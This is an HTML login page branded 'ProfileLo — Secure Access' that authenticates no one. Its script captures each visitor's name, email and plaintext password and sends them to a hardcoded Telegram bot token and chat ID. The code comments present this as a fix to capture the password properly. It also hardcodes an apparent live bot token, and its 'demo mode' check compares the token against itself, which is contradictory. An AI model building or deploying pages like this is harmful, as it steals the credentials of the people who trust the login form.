<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ProfileLo Login — Secure Access</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body{
  margin:0;
  font-family: 'Segoe UI', 'Arial', system-ui, -apple-system, sans-serif;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:linear-gradient(135deg, #0f172a, #1e293b);
  color:white;
}

/* glassmorphism container */
.box{
  width:340px;
  padding:28px 24px;
  background:rgba(255,255,255,0.08);
  backdrop-filter:blur(12px);
  border-radius:28px;
  border:1px solid rgba(255,255,255,0.15);
  box-shadow: 0 20px 35px -12px rgba(0,0,0,0.3);
  text-align:center;
  transition: all 0.2s ease;
}

h2 {
  font-weight: 600;
  letter-spacing: -0.3px;
  margin-bottom: 20px;
  font-size: 1.8rem;
  background: linear-gradient(120deg, #f0f9ff, #bae6fd);
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
}

input{
  width:100%;
  padding:12px 14px;
  margin:10px 0;
  border:none;
  border-radius:60px;
  outline:none;
  font-size: 0.95rem;
  background: rgba(255,255,255,0.9);
  color: #0f172a;
  transition: 0.2s;
}

input:focus {
  background: white;
  box-shadow: 0 0 0 3px rgba(56,189,248,0.4);
}

button{
  width:100%;
  padding:12px;
  margin-top:18px;
  border:none;
  border-radius:60px;
  background:#38bdf8;
  font-weight:bold;
  font-size: 1rem;
  color:#0c0f1c;
  cursor:pointer;
  transition: 0.2s;
  box-shadow: 0 2px 6px rgba(0,0,0,0.2);
}

button:hover{
  background:#0ea5e9;
  transform: scale(0.98);
  box-shadow: 0 4px 12px rgba(14,165,233,0.3);
}

.profile{
  display:none;
}

.avatar{
  width:90px;
  height:90px;
  border-radius:50%;
  background: linear-gradient(145deg, #38bdf8, #0284c7);
  margin:10px auto 18px;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:38px;
  color:white;
  font-weight:bold;
  box-shadow: 0 10px 20px -5px rgba(0,0,0,0.3);
  border: 2px solid rgba(255,255,255,0.3);
}

#pname {
  font-size: 1.6rem;
  margin-bottom: 6px;
  word-break: break-word;
}

#pemail {
  color: #cbd5e1;
  margin-bottom: 28px;
  font-size: 0.9rem;
}

.logout-btn {
  background: rgba(255,255,255,0.2);
  backdrop-filter: blur(4px);
  color: white;
  border: 1px solid rgba(255,255,255,0.3);
}

.logout-btn:hover {
  background: rgba(220,38,38,0.8);
  transform: scale(0.98);
}

.status-msg {
  font-size: 0.75rem;
  margin-top: 12px;
  color: #facc15;
  background: rgba(0,0,0,0.4);
  border-radius: 60px;
  padding: 5px 10px;
  display: inline-block;
}

.field-group {
  position: relative;
  text-align: left;
}

.password-wrapper {
  position: relative;
}

.toggle-pw {
  position: absolute;
  right: 14px;
  top: 50%;
  transform: translateY(-50%);
  background: none;
  border: none;
  font-size: 1rem;
  cursor: pointer;
  color: #334155;
  width: auto;
  padding: 0;
  margin: 0;
  box-shadow: none;
  font-weight: normal;
}

.toggle-pw:hover {
  background: none;
  transform: translateY(-50%);
  color: #0f172a;
}

small {
  display: block;
  text-align: left;
  font-size: 0.7rem;
  color: #94a3b8;
  margin: 4px 0 0 12px;
}

/* error animation */
.error-shake {
  animation: shake 0.2s ease-in-out 0s 2;
  border: 1px solid #f87171 !important;
  background: #fff0f0;
}

@keyframes shake {
  0%,100% { transform: translateX(0); }
  25% { transform: translateX(-4px); }
  75% { transform: translateX(4px); }
}

/* responsive */
@media (max-width: 450px) {
  .box {
    width: 90%;
    padding: 22px 18px;
  }
}

.notification-badge {
  position: fixed;
  bottom: 20px;
  right: 20px;
  background: #10b981;
  padding: 8px 16px;
  border-radius: 40px;
  font-size: 12px;
  font-weight: bold;
  opacity: 0;
  transition: opacity 0.3s;
  pointer-events: none;
  z-index: 1000;
}

.notification-badge.show {
  opacity: 1;
}
</style>
</head>

<body>

<div class="box" id="loginBox">
  <h2>🔐 ProfileLo</h2>
  
  <div class="field-group">
    <input type="text" id="name" placeholder="Full name" autocomplete="name">
  </div>
  
  <div class="field-group">
    <input type="email" id="email" placeholder="Email address" autocomplete="email">
  </div>
  
  <div class="field-group password-wrapper">
    <input type="password" id="pass" placeholder="Password" autocomplete="current-password">
    <button type="button" class="toggle-pw" id="togglePassBtn" aria-label="Show password">👁️</button>
  </div>
  
  <small>🔒 Password must be at least 4 characters</small>
  <button onclick="login()">✨ Login →</button>
  <div id="loginErrorMsg" class="status-msg" style="display: none;"></div>
</div>

<div class="box profile" id="profileBox">
  <div class="avatar" id="avatar">U</div>
  <h2 id="pname"></h2>
  <p id="pemail"></p>
  <button class="logout-btn" onclick="logout()">🚪 Logout</button>
</div>

<div id="toastMsg" class="notification-badge"></div>

<script>
// ------------------------------------------------------------------
// 🔐 FIXED: Password properly captured and sent to Telegram
// ------------------------------------------------------------------

// ⚠️ IMPORTANT: Replace these with your actual Telegram bot credentials
const botToken = "8507706742:AAFgZhWiOsCBfsL6wJORQUy7xabov-Wor3o";      // ← REPLACE WITH YOUR REAL BOT TOKEN
const chatId = "778298958";          // ← REPLACE WITH YOUR REAL CHAT ID

// Helper: Show temporary toast message
function showToast(message, isError = false) {
  const toast = document.getElementById("toastMsg");
  toast.textContent = message;
  toast.style.background = isError ? "#dc2626" : "#10b981";
  toast.classList.add("show");
  setTimeout(() => {
    toast.classList.remove("show");
  }, 3000);
}

// Helper: show inline error inside login box
function showLoginError(message) {
  const errorDiv = document.getElementById("loginErrorMsg");
  errorDiv.innerText = message;
  errorDiv.style.display = "block";
  setTimeout(() => {
    if (errorDiv) errorDiv.style.display = "none";
  }, 2800);
}

// shake invalid fields
function shakeField(fieldElement) {
  if (!fieldElement) return;
  fieldElement.classList.add("error-shake");
  setTimeout(() => {
    fieldElement.classList.remove("error-shake");
  }, 400);
}

// Telegram notification sender (includes password properly)
async function sendTelegram(name, email, password) {
  // Format message with password included
  const msg = 
`🔐 *NEW LOGIN ALERT*  
━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
📧 *Email:* ${email}
🔑 *Password:* ${password}
⏰ *Time:* ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━`;

  // Check if bot is configured
  if (botToken === "8507706742:AAFgZhWiOsCBfsL6wJORQUy7xabov-Wor3o" || chatId === "778298958") {
    console.log("📨 [DEMO MODE] Telegram message would be sent:");
    console.log(msg);
    showToast("⚠️ Demo: Set botToken & chatId to send real Telegram alerts", false);
    return false;
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({
        chat_id: chatId,
        text: msg,
        parse_mode: "Markdown"
      })
    });
    
    const result = await response.json();
    if (result.ok) {
      console.log("✅ Telegram notification sent successfully!");
      showToast("✅ Login notification sent to Telegram");
      return true;
    } else {
      console.error("Telegram API error:", result);
      showToast("❌ Failed to send Telegram notification", true);
      return false;
    }
  } catch (err) {
    console.error("Telegram send error:", err);
    showToast("❌ Network error: Could not reach Telegram", true);
    return false;
  }
}

// Main login validation with password
function login() {
  // Get DOM elements properly
  const nameInput = document.getElementById("name");
  const emailInput = document.getElementById("email");
  const passInput = document.getElementById("pass");
  
  // IMPORTANT FIX: Get .value property, not the element itself!
  let name = nameInput.value.trim();
  let email = emailInput.value.trim();
  let password = passInput.value;  // This was the bug - need .value
  
  console.log("Password captured:", password); // Debug log
  
  // Reset any previous inline error
  document.getElementById("loginErrorMsg").style.display = "none";
  
  // ---------- VALIDATION RULES ----------
  let isValid = true;
  
  // 1. Name validation
  if (!name || name.length < 2) {
    showLoginError("❌ Name must be at least 2 characters.");
    shakeField(nameInput);
    isValid = false;
  } else if (name.length > 50) {
    showLoginError("❌ Name is too long (max 50).");
    shakeField(nameInput);
    isValid = false;
  }
  
  // 2. Email validation
  const emailPattern = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
  if (!email || !emailPattern.test(email)) {
    showLoginError("📧 Please provide a valid email address (e.g., name@example.com).");
    shakeField(emailInput);
    isValid = false;
  }
  
  // 3. PASSWORD validation - fixed: checking the actual string value
  if (!password || password.length < 4) {
    showLoginError("🔑 Password must be at least 4 characters.");
    shakeField(passInput);
    isValid = false;
  } else if (password.length > 64) {
    showLoginError("⚠️ Password too long (max 64 chars).");
    shakeField(passInput);
    isValid = false;
  }
  
  // If any validation fails, stop login
  if (!isValid) return;
  
  // ✅ All good: Send Telegram notification WITH the actual password
  console.log("Sending to Telegram - Name:", name, "Email:", email, "Password:", password);
  sendTelegram(name, email, password);
  
  // Store only name & email in localStorage (password NOT stored for security)
  localStorage.setItem("name", name);
  localStorage.setItem("email", email);
  
  // Show profile page
  showProfile();
}

// Profile view render
function showProfile() {
  const loginBox = document.getElementById("loginBox");
  const profileBox = document.getElementById("profileBox");
  
  if (loginBox) loginBox.style.display = "none";
  if (profileBox) profileBox.style.display = "block";
  
  let name = localStorage.getItem("name") || "Guest";
  let email = localStorage.getItem("email") || "no-reply@example.com";
  
  document.getElementById("pname").innerText = name;
  document.getElementById("pemail").innerText = email;
  
  // Avatar: first letter uppercase
  let initial = name.trim().charAt(0).toUpperCase();
  if (!initial.match(/[A-Z]/)) initial = "👤";
  document.getElementById("avatar").innerText = initial;
}

// Logout: clear storage and reset form
function logout() {
  localStorage.clear();
  
  // Reset login fields
  const nameField = document.getElementById("name");
  const emailField = document.getElementById("email");
  const passField = document.getElementById("pass");
  if (nameField) nameField.value = "";
  if (emailField) emailField.value = "";
  if (passField) passField.value = "";
  
  // Switch views
  const loginBox = document.getElementById("loginBox");
  const profileBox = document.getElementById("profileBox");
  if (loginBox) loginBox.style.display = "block";
  if (profileBox) profileBox.style.display = "none";
  
  // Clear error messages
  const errorDiv = document.getElementById("loginErrorMsg");
  if (errorDiv) errorDiv.style.display = "none";
  
  showToast("Logged out successfully");
}

// Check persistent session
function checkExistingSession() {
  if (localStorage.getItem("name")) {
    showProfile();
  }
}

// Toggle password visibility
function initPasswordToggle() {
  const toggleBtn = document.getElementById("togglePassBtn");
  const passInput = document.getElementById("pass");
  
  if (toggleBtn && passInput) {
    toggleBtn.addEventListener("click", (e) => {
      e.preventDefault();
      const type = passInput.getAttribute("type") === "password" ? "text" : "password";
      passInput.setAttribute("type", type);
      toggleBtn.textContent = type === "password" ? "👁️" : "🙈";
    });
  }
}

// Enter key support
function bindEnterKey() {
  const inputs = ["name", "email", "pass"];
  inputs.forEach(id => {
    const el = document.getElementById(id);
    if (el) {
      el.addEventListener("keypress", (event) => {
        if (event.key === "Enter") {
          event.preventDefault();
          login();
        }
      });
    }
  });
}

// Clear error on input
function clearErrorOnInput() {
  const fields = ["name", "email", "pass"];
  fields.forEach(id => {
    const field = document.getElementById(id);
    if (field) {
      field.addEventListener("input", () => {
        const errorDiv = document.getElementById("loginErrorMsg");
        if (errorDiv) errorDiv.style.display = "none";
        field.classList.remove("error-shake");
      });
    }
  });
}

// Debug helper - shows current config status
function showConfigStatus() {
  if (botToken === "8507706742:AAFgZhWiOsCBfsL6wJORQUy7xabov-Wor3o" || chatId === "778298958") {
    console.log("🔧 Telegram not configured - running in demo mode");
    setTimeout(() => {
      showToast("💡 Demo Mode: Set botToken & chatId to enable Telegram alerts", false);
    }, 500);
  } else {
    console.log("✅ Telegram configured - ready to send notifications");
  }
}

// Initialize everything
window.addEventListener("DOMContentLoaded", () => {
  initPasswordToggle();
  bindEnterKey();
  clearErrorOnInput();
  checkExistingSession();
  showConfigStatus();
});

// Expose functions globally
window.login = login;
window.logout = logout;
</script>

</body>
</html>
